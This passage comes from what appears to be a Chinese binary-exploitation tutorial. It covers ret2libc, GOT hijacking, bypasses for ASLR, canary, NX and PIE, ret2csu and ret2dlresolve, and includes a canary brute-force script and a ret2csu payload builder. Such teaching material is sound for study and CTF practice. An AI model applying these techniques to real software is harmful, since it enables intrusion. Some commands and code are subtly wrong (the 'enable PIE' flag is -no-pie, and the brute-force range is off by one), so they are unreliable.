system偏移</code>，其中<code>puts地址-puts偏移</code>计算出的就是libc的基地址。计算出system的地址以后就可以通过其他方式修改got表中其他函数的地址，实现got表劫持，此外libc中一般都自带了字符串<code>/bin/sh</code>，只需要知道该字符串在libc中的偏移地址就无需自己构造该字符串。</p><p>需要注意的是libc中除了system还有一个函数execve也可以执行命令，由于system函数中可能会对内存对齐进行检查，导致执行失败，所以当使用system函数执行失败后可以在system函数之前的参数添加buf使内存对齐，或者改用execve函数。</p><p>此外，在没有开启PIE的情况下，got表的基地址是固定的，因此通过IDA获取got表中某条目的地址以后，修改该地址就可以劫持控制流，由于对应的plt表第一条指令就是jmp到got表对应条目中存储的地址，通过修改got表中的地址就可以直接劫持控制流，jmp到需要的地址，这是一种很常见的劫持控制流的方法。</p><p>为了方便我们写入<code>/bin/sh</code>，可以直接修改got表上的部分函数为system，例如<code>strlen(user_input),strcmp(user_input,xx),strncmp(user_input,xx),memcmp(user_input,xx),atoi(user_input),free(user_input)</code>，这些函数都可以直接接收用户输入作为参数，修改为system就可以。</p><h1 id="0x8-Protection-Bypass"><a href="#0x8-Protection-Bypass" class="headerlink" title="0x8 Protection Bypass"></a>0x8 Protection Bypass</h1><ul><li><p>ASLR（Address Space Layout Randomization，地址空间布局随机化）</p><p>  一种由操作系统提供的保护机制，将部分内存基地址随机化使攻击者无法预测地址。大部分操作系统都默认开启ASLR。</p><p>  ASLR主要有3个级别：</p><ul><li><p>0 — 关闭ASLR，每次加载程序的堆栈，libc等地址均相同</p></li><li><p>1 — 开启ASLR，主要影响mmap基地址，栈基地址，libc基地址</p></li><li><p>2 — 开启强化ASLE，在1级别的基础上增加了堆随机化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置ASLR，注意在Docker中无法关闭ASLR</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>Canary（金丝雀）</p><p>  以前的矿工下矿之前为了检查矿井内是否有有毒气体，通常会将一只金丝雀送进去，如果金丝雀死了，就代表矿洞内有有毒气体（也有版本说是盗墓者盗墓会用金丝雀判断墓穴内是否有有毒气体）。</p></li></ul><pre><code>Canary是一种防止栈溢出的保护机制，其原理为在程序的入口处首先从fs/gs寄存器偏移0x28处取出4或8个字节（取决于操作系统位数）压入栈中，之后在开辟其他局部变量栈帧，当函数执行结束以后再检查该值是否与之前相同，若相同则正常退出函数，否则检测到发生栈溢出，调用\_\_stack\_chk\_fail函数强制终止程序运行。为了避免canary被其上方的局部变量一起打印输出，canary通常以0x00结尾以截断canary上面局部变量的字符串。编译器通常默认不开启canary保护。Canary在栈中结构如下所示。![](/StackOverflow-CheatSheet/8.png)\_\_stack\_chk\_fail函数原型如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭canary</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启canary，但是只会为局部变量中含有char数组的函数开启</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 为所有函数开启canary</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></code></pre><ul><li><p>NX（No Execute，堆栈不可执行）</p><p>  将堆栈内存页标记为不可执行，当控制流程转入堆栈上以后，CPU若尝试在堆栈上执行指令时就会引发异常。编译器通常默认开启NX。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭NX</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启NX</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>PIE（Position Independent Executable，地址无关代码）</p><p>  基于ASLR的代码段与数据段地址随机化技术，需要编译器将程序编译成位置无关，并链接为ELF共享对象，程序每次加载到内存中以后代码地址与数据地址均不同，主要影响代码段(.text)，数据段(.data)与全局数据段(.bss)。注意只有开启了ASLR，PIE才会生效，编译器通常默认开启PIE。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启PIE</span></span><br><span class="line">gcc -no-pie -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>RELRO（Read Only Relocation，重定向只读）</p><p>  将经过动态链接器处理过后的内存区域设置为只读权限以避免got表劫持这类攻击方式。RELRO通常有两种：</p><ul><li><p>Partial RELRO</p><p>  影响部分通过动态链接器处理的内存段(.init_array .fini_array .jcr .dynamic .got)并且设置为只读，但是got表(.got.plt)还是可写的</p></li><li><p>Full RELRO</p><p>  在Partial RELRO的基础上经用了延迟绑定，got表中所有条目在程序刚加载libc的时候全部解析完成，并且将got表设置为只读。</p></li></ul></li></ul><pre><code>编译器通常默认开启Partial RELRO。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启Partial RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c</span><br><span class="line"><span class="comment"># 开启Full RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure></code></pre><h2 id="0x80-常用绕过"><a href="#0x80-常用绕过" class="headerlink" title="0x80 常用绕过"></a>0x80 常用绕过</h2><ol><li><p>ret2text</p><p> 修改返回地址到程序中已经存在的代码处，例如有些程序中可能提供了执行系统命令的方法。</p></li><li><p>ret2syscall</p><p> 如0x5节中所提到的，通过ROP构造系统调用execve执行命令。</p></li><li><p>ret2shellcode</p><p> 如0x6节中所提到的，通过将shellcode写入某处具有可执行权限的内存并且执行shellcode，shellcode通常也是一段进行系统调用的二进制代码。</p></li><li><p>ret2libc</p><p> 如0x7节中所提到的，通过程序中泄漏的libc地址来获取system函数在libc中的真实地址，从而跳转到libc中的system函数执行命令。</p></li></ol><h2 id="0x81-Bypass-ASLR"><a href="#0x81-Bypass-ASLR" class="headerlink" title="0x81 Bypass ASLR"></a>0x81 Bypass ASLR</h2><p>ASLR是最常见的保护措施，有很多种基础的方法可以绕过，大部分方法在前文中均介绍过。</p><ol><li><p>nop垫</p><p> 若没有开启NX（比较少见），则可以将shellcode写入栈上，但是由于无法确定shellcode准确的地址，因此可以在shellcode前面填充大量的nop指令（0x90，也称为nop垫，该指令什么也不做），跳转的时候可以跳转到一个大致的范围，只要命中了一个nop垫，就可以一直滑行到shellcode，nop垫填充的越多，命中的概率越大。</p></li><li><p>泄漏libc基地址</p><p> 最常用的办法，如0x7节中所讲， 先泄漏出libc中某个函数的地址以后再计算出其他函数的地址，此类攻击方法要求程序必须一次执行可以多次输入输出。</p></li><li><p>爆破libc基地址</p><p> 由于libc基地址的随机化只会影响一个字节也就是8位，所以最多只需要爆破256次就可以爆破出正确的libc基地址。libc基地址的最后12位（3个十六进制数）都是0，从倒数第20位到倒数第12位这8位每次都会改变，其余位不变，例如0xf7fxx000，其中xx为每次改变的字节。该攻击方法需要提前知道libc版本。</p></li><li><p>修改got表</p><p> 比较常用的办法。如0x7节中修改got表的方法，可以将got表项修改为某个libc函数地址，如果没有开启PIE，也可以修改为ROP链的起始地址。</p></li><li><p>ROP链</p><p> 也是非常常用的办法，如果没有开启PIE则可以直接构造ROP链。</p></li></ol><h2 id="0x82-Bypass-Canary"><a href="#0x82-Bypass-Canary" class="headerlink" title="0x82 Bypass Canary"></a>0x82 Bypass Canary</h2><p>比较令人烦恼的保护措施，canary主要为了防止栈溢出，并且canary最后一个字节为0x00。</p><ol><li><p>泄漏canary</p><p> 最常用的方法。为了避免canary被其他局部变量附带输出，所以canary通常以0x00结尾以截断canary上面的局部变量，因此可以通过栈溢出覆盖掉canary最后的0x00，使其可以被附带输出，即可泄漏canary，拿到canary以后溢出的时候将canary填写到对应的位置即可绕过。</p></li><li><p>爆破canary</p><p> 程序每次启动后canary是不同的，但是对于同一个进程，由于子进程会拷贝父进程的内存，子线程与父线程共用内存，所以一个程序的子进程和子线程的canary都是相同的，因此如果程序可以多次fork子进程或者启动子线程，那么就可以在子进程或子线程中爆破canary。</p></li></ol><pre><code>对于爆破过程，采用逐字节爆破是最高效的，每次爆破最低的一个字节（8位，16\*16=256次），从0x00到0xff，并且canary的结尾必是`\x00`，因此32位只需要爆破3个字节（256\*3=768次），64位只需要爆破7个字节（256\*7=1792次）。爆破canary的脚本如下<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p) + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">      ret = send_and_recv(p + chr(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ret:</span><br><span class="line">         canary += chr(i)</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;[+] Find 0x%02x&quot;</span> % i</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;[-] Brute failed&quot;</span></span><br><span class="line">         sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = canary[stop:start<span class="number">-1</span>:<span class="number">-1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[+] Got canary: 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure></code></pre><ol start="3"><li><p>劫持__stack_chk_fail</p><p> 该函数在canary对比失败以后会被调用，该函数会强制终止程序。该函数属于libc，因此函数地址在got表中，通过劫持got表可以修改该函数从而使程序不会被终止。此外由于该函数在终止前还会打印出argv[0]的内容（也就是程序名），因此如果可以获取到argv在libc中的地址，并且修改argv，就可以通过该函数打印出需要的数据。</p></li><li><p>修改canary</p><p> 在前文中提到过，函数中的canary是从fs/gs寄存器偏移0x28处取出4或8个字节，实际上fs/gs寄存器偏移0x28处是TLS(thread local storage，线程局部存储)中的stack_guard值，因此如果可以修改TLS中的stack_guard就可以修改canary。</p></li></ol><h2 id="0x83-Bypass-NX"><a href="#0x83-Bypass-NX" class="headerlink" title="0x83 Bypass NX"></a>0x83 Bypass NX</h2><p>NX为了防止堆栈上的shellcode，也很常见。开启NX以后就不能直接把shellcode写入堆栈上，但是可以想办法找到其他具有可执行权限的段去写，不过Bypass NX最常用的方法就是ROP，使用ROP只需要把ROP链的各个地址与参数压入栈中，最终跳转到shellcode地址或者构造系统调用，ROP的执行过程还是在代码段中。或者可以如0x7中所介绍的攻击方法，总之开启了NX就代表堆栈上无法执行任何代码。</p><h2 id="0x84-Bypass-PIE"><a href="#0x84-Bypass-PIE" class="headerlink" title="0x84 Bypass PIE"></a>0x84 Bypass PIE</h2><p>最麻烦的保护措施，通过将代码段，数据段，全局变量段等进行地址随机化，使得常用的ROP技术失效（制作ROP链需要知道Gadgets的地址）。程序中每一条指令的地址都作为一个偏移，在程序执行的过程中指令的真实地址就是程序运行时的基地址加上该指令偏移地址就可以得到真实地址。由于每次程序执行代码地址都会变，因此不方便下断点调试，可以在gdb中先用vmmap查看程序基地址，再加上偏移地址就可以得到真实地址。</p><ol><li><p>partial write</p><p> 最常用的绕过方式，开启了PIE后虽然基地址每次都会改变，但是低12位(3个十六进制数)是不变的，因此通过改写后12位地址就控制一部分范围的偏移跳转，若目标地址刚好位于修改第12位就可以跳转的范围内，就可以通过partial write绕过PIE</p></li><li><p>泄漏地址</p><p>开启PIE的程序每条指令都采用相对偏移地址，很类似0x7节中libc函数的情况 ，每条指令的偏移是可以事先得知的，因此只要能够在程序运行的过程中泄漏出任何一个指令的真实地址，那么就可以计算出程序的基地址，这样其他指令的地址就可以得知了，类似0x7节中泄漏libc基地址计算system的地址。</p></li><li><p>vsyscall</p><p> 为了加快程序执行系统调用的速度，部分linux内核将部分无参数的系统调用从内核空间映射到用户空间里，这些被映射的系统调用被称为vsyscall。程序就算开启了PIE，但是vsyscall的地址是不变的，所以vsyscall中调用syscall指令的地址也是一直不变的，这样我们就有了一个<code>syscall</code>的gadget。需要注意的是直接rop跳到vsyscall里的<code>syscall</code>会段错误，因为vsyscall会检查是否是从该系统调用的开头开始执行的（例如syscall的地址是0xffffffffff600007，而该系统调用函数的开头是0xffffffffff600000，所以我们只能先跳转到0xffffffffff600000）。此外，现在的部分操作系统已经删除了vsyscall功能。</p></li><li><p>vdso</p><p> vdso是为了取代vsyscall而存在的，功能和vsyscall一样，由glibc提供，因此vdso中的地址是随机化的，不过好处是vdso中的任意一条指令都可以执行，不像vsyscall还会检查是否是从开头执行。那么如果要利用vdso，就需要爆破出vdso中的指令地址，在64位下vdso的地址随机化达到22位，而32位仅有16位（一个字节）是随机的，比较容易爆破，</p></li></ol><h2 id="0x85-ret2csu"><a href="#0x85-ret2csu" class="headerlink" title="0x85 ret2csu"></a>0x85 ret2csu</h2><p>此攻击方式是<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf">BlackHat2018</a>中提出来的，可以看做是rop的万金油，其作用就是在<strong>x64系统</strong>下利用__libc_csu_init函数中提供的通用Gadgets来实现调用任意参数小于等于3个的函数。__libc_csu_init位于程序中，其作用就是初始化libc，所以此攻击的前提就是程序需要调用libc。在__libc_csu_init中一共有两段可用的Gadgets，如下所示（这里提供的示例来自CTF Wiki，不同的libc版本该函数的内容可能不太一样，但是总体上是差不多的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">; Second Gadgets.</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">; First Gadgets.</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p>第一段Gadgets从0x40061A开始（即pop rbx）可以利用栈上的值控制寄存器rbx，rbp，r12，r13，r14，r15，第二段Gadgets从0x400600开始（即mov rdx, r13），可以通过r13，r14与r15控制函数的前三个参数rdx，rsi与rdi（只能控制低32位4个字节，高32位为0），而之后紧接着就有一个call，通过r12与rbx就可以构造出目标函数的地址。call指令结束以后后面三条指令的目的就是需要满足rbp==rbx+1，如果满足该关系式程序逻辑就不会进行跳转，而是继续执行后面的指令。</p><p>攻击前提：</p><ol><li>64位程序</li><li>使用了libc</li><li>没有开启PIE</li></ol><p>由于可控制的函数的第一个参数只能控制4个字节，因此system函数这一类的就用不了，但是可以利用read或者write函数读写地址。利用的exp如下（不同版本可能寄存器不太一样）。其中gadgets1和gadgets2对应的就是上面的First gadgets和Second gadgets。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">gadgets1, gadgets2, func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    rbx, rbp = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    r12 = func_addr</span><br><span class="line">    r13 = arg2  <span class="comment"># rdx</span></span><br><span class="line">    r14 = arg1  <span class="comment"># rsi</span></span><br><span class="line">    r15 = arg0  <span class="comment"># rdi, only low 32bits available.</span></span><br><span class="line">    <span class="keyword">return</span> p64(gadgets1) + \</span><br><span class="line">p64(rbx) + p64(rbp) + \</span><br><span class="line">    p64(r12) + p64(r13) + \</span><br><span class="line">        p64(r14) + p64(r15) + \</span><br><span class="line">        p64(gadgets2)</span><br><span class="line"></span><br><span class="line">conn.send(junkdata + ret2csu(...))</span><br></pre></td></tr></table></figure><h2 id="0x86-ret2dlresolve"><a href="#0x86-ret2dlresolve" class="headerlink" title="0x86 ret2dlresolve"></a>0x86 ret2dlresolve</h2><p>在0x7节中libc中提到过plt表的第一项就是跳转到_dl_runtime_resolve函数，该函数的作用就是动态将libc中的函数地址写入got表中，并且执行被解析到函数。_dl_runtime_resolve函数原型为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，假如可以控制这两个参数，就可以控制_dl_runtime_resolve解析并执行我们想要的函数。</p><p>plt表与got表的部分结构如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">push got[1]</span><br><span class="line">jmp got[2]</span><br><span class="line">func@plt:</span><br><span class="line">jmp func@got</span><br><span class="line">push func_index</span><br><span class="line">jmp plt[0]</span><br><span class="line"></span><br><span class="line">got[0] ---&gt; .dynamic address</span><br><span class="line">got[1] ---&gt; link_map_object address</span><br><span class="line">got[2] ---&gt; _dl_runtime_resolve address</span><br></pre></td></tr></table></figure><p>通过上表可以看到_dl_runtime_resolve函数的两个参数link_map_obj与对应的函数reloc_index分别在func@plt与plt[0]中被push到栈中，而jmp到got[2]以后直接调用_dl_runtime_resolve函数，执行顺序的行数为5，6，7，2，3，11。</p><p>在_dl_runtime_resolve调用的时候，会做如下几件事，而这几件事对后续的ret2dlresolve利用非常重要。</p><ol><li>首先通过link_map_object访问.dynamic段（link_map_object保存了.dynamic地址），分别取出.dynstr，.dynsym和.rel.plt的地址，其中.dynstr为动态链接字符串表，包含了动态链接时所需要的所有字符串（包括函数名），.dynsym是动态链接符号表，类似符号表，里面保存了和动态链接相关的所有符号，.rel.plt是动态链接代码重定位段，包含了需要重定位的函数信息，包括函数偏移，在符号表中的索引等。</li><li>在取出这三个地址以后，先通过.rel.plt地址+reloc_index就可以计算出要被动态链接的函数的重定位表指针rel</li><li>然后通过<code>rel-&gt;r_info&gt;&gt;8</code>就可以计算出在.dynsym动态链接符号表中的下标</li><li>根据.dynsym的地址+下标偏移就可以拿到对应符号表项的指针sym</li><li>之后通过.dynstr地址+<code>sym-&gt;st_name</code>就可以取出符号名字符串的指针，也就是函数名指针</li><li>然后在动态链接库中查找这个函数的地址，并把地址写入<code>*(rel-&gt;r_offset)</code>，也就是该函数对应的got表项</li><li>最后调用这个函数</li></ol><p>其中.dynamic段的结构是一个数组，数组每一项的结构如下所示，其实根据d_tag的值就可以很容易在.dynamic中找到对应项地址，.dynstr，.dynsym和.rel.plt对应的tag值为5，6，17。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NULL   0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NEEDED 1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTGOT 3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HASH   4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB 5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB 6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELA   7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELASZ 8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRSZ  10    <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMENT 11    <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT   12    <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI   13    <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SONAME 14    <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RPATH  15    <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMBOLIC 16    <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_REL    17    <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELSZ  18    <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELENT 19    <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL 20    <span class="comment">/* Type of reloc in PLT */</span></span></span><br></pre></td></tr></table></figure><p>.dynsym是一个数组，数组的每一项sym的结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure><p>.rel.plt也是一个数组，数组的每一项rel的结构如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 